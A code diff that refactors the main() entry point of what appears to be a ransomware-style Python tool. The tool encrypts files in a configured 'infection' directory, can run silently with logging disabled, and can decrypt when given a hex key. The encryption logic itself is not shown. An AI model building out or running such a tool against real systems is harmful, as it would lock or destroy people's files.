@@ -20,32 +20,23 @@ def main():
     if args.silent:
         st_logger.set_log_level("NOTSET")
         st_logger.logger.propagate = False
-        if args.reverse:
-            desinfection = Desencryptation(st_logger, config.get_infection_dir(),
-                                            config.get_infection_extensions(),
-                                            args.reverse)
-            if desinfection.validate_hexadecimal_key():
-                desinfection.run()
-        elif not args.version:
-            infection = Encryptation(st_logger, config.get_infection_dir(),
-                                        config.get_infection_extensions(),
-                                        config.get_infection_key())
-            if infection.validate_hexadecimal_key():
-                infection.run()
-    elif args.version:
-        st_logger.logger.info(config.get_program_version())
-    elif args.reverse:
+    if args.reverse:
         desinfection = Desencryptation(st_logger, config.get_infection_dir(),
                                         config.get_infection_extensions(),
                                         args.reverse)
         if desinfection.validate_hexadecimal_key():
             desinfection.run()
-    else:
+        return
+    if not args.reverse and not args.silent and args.version:
+        st_logger.logger.info(config.get_program_version())
+        return
+    if not args.reverse and not args.version:
         infection = Encryptation(st_logger, config.get_infection_dir(),
                                     config.get_infection_extensions(),
                                     config.get_infection_key())
         if infection.validate_hexadecimal_key():
             infection.run()
+        return
 
 if __name__ == "__main__":
     main()
